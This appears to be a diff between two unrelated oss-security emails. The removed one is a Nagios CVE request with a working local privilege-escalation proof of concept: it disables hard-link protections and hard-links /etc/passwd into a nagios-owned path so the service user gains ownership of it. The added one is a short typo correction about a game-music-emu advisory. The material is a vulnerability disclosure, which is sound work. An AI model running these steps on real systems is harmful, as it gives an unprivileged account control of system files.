@@ -1,105 +1,30 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/30/5
-Message-ID: <e5e71351-83ac-5324-7f70-ad40ef5bf9be@orlitzky.com>
-Date: Fri, 30 Dec 2016 13:37:37 -0500
-From: Michael Orlitzky <michael@...itzky.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/15/2
+Message-ID: <20161215053803.GA2527@lorien.valinor.li>
+Date: Thu, 15 Dec 2016 06:38:03 +0100
+From: Salvatore Bonaccorso <carnil@...ian.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE request: Nagios: Incomplete fix for CVE-2016-8641
+Subject: Re: CVE Request: Game Music Emulators: incorrect emulation of the SPC700 audio co-processor of SNES: arbitrary code execution via malformed SPC music file
 Content-Type: text/plain; charset=utf-8
 
-Author: Michael Orlitzky (michael@...itzky.com)
-Software Name: Nagios
-Vendor Name: Nagios Enterprises, LLC
-Type of vulnerability: root privilege escalation
-Reported to vendor: 2016-12-26
+H,
 
-Exploit Vector
---------------
-The init script for Nagios calls "chown" on a path under the control of
-Nagios's (usually restricted) user. CVE-2016-8641 describes an attack
-wherein that restricted user replaces the aforementioned path with a
-symlink. The root user (via the init script) will -- the next time
-Nagios is started -- give ownership of the symlink's target to Nagios's
-user. In that manner, the restricted Nagios user can gain root.
+On Thu, Dec 15, 2016 at 06:33:48AM +0100, Salvatore Bonaccorso wrote:
+> Hi
+> 
+> As reported by Chris Evans via
+> 
+> http://scarybeastsecurity.blogspot.de/2016/12/redux-compromising-linux-using-snes.html
+> 
+> Incorrect emulation of the SPC700 audio co-processor of the Super
+> Nintendo Entertainment System allows the execution of arbitrary code
+> if a malformed SPC music file is opened.
+> 
+> Debian released a DSA for this issue (in the qemu-music-emu source
+> package):
 
-An identical attack not addressed by CVE-2016-8641 works with hard
-links. As long as no special kernel protections are in place, the
-restricted Nagios user can replace the path (in the directory he
-controls) by a hard-link. The call to "chown" in the init script affects
-the target of that hard link.
+There is an obvious typo in the above, not qemu-music-emu, but
+game-music-emu.
 
-
-Attack outcome
---------------
-The restricted Nagios user gains control of any file on the same
-filesystem as its runtime directory.
-
-
-Affected versions
------------------
-Versions 4.2.2 and older are affected by the symlink attack of
-CVE-2016-8641; those and newer versions, up to the current version
-4.2.4, are affected by the hard-link attack.
-
-
-Source code
------------
-The fix for CVE-2016-8641 is contained in the following commit, which
-prohibits "chown" from following symlinks only (via the --no-dereference
-flag):
-
-https://github.com/NagiosEnterprises/nagioscore/commit/f2ed227673d3b2da643eb5cad26b2d87674f28c1
-
-
-Mitigation
-----------
-The creation of the problematic hard link is blocked if the user has the
-fs.protected_hardlinks sysctl enabled. It is *not enabled* by default in
-the vanilla Linux kernel, but some distributions patch that default.
-
-It can be enabled with (as root):
-
-  sysctl -w fs.protected_hardlinks=1
-
-The grsecurity patches for the Linux kernel provide similar protection
-when CONFIG_GRKERNSEC_LINK=y.
-
-
-Exploit
--------
-
-The following commands should grant ownership of /etc/passwd to the new,
-restricted "nagios" user. Beware that in order for the attack to work,
-some important (but non-default) sysctls are disabled. The two paths
-/etc/passwd and /usr/local/nagios must live on the same filesystem.
-Afterwards you should re-enable the two sysctls (if they were enabled to
-begin with), clean up /usr/local, and remove the "nagios" user.
-
-  sudo mkdir -p /usr/local/tmp \
-                /usr/local/etc/init.d \
-                /usr/local/etc/apache2
-  sudo chmod 777 /usr/local/tmp
-
-  wget
-https://github.com/NagiosEnterprises/nagioscore/archive/release-4.2.4.tar.gz
-  tar -xf release-4.2.4.tar.gz
-  rm release-4.2.4.tar.gz
-  cd nagioscore-release-4.2.4
-  sudo useradd nagios -m -d /home/nagios
-  ./configure --with-nagios-user=nagios \
-              --with-temp-dir=/usr/local/tmp \
-              --with-init-dir=/usr/local/etc/init.d \
-              --with-httpd-conf=/usr/local/etc/apache2
-  make all
-  sudo make install
-  sudo make install-config
-  sudo make install-init
-  sudo sysctl -w kernel.grsecurity.linking_restrictions=0
-  sudo sysctl -w fs.protected_hardlinks=0
-
-  sudo -u nagios -s
-  ln -f /etc/passwd /usr/local/nagios/var/nagios.log
-  exit
-
-  sudo /usr/local/etc/init.d/nagios start
-  ls /etc/passwd
+Regards,
+Salvatore
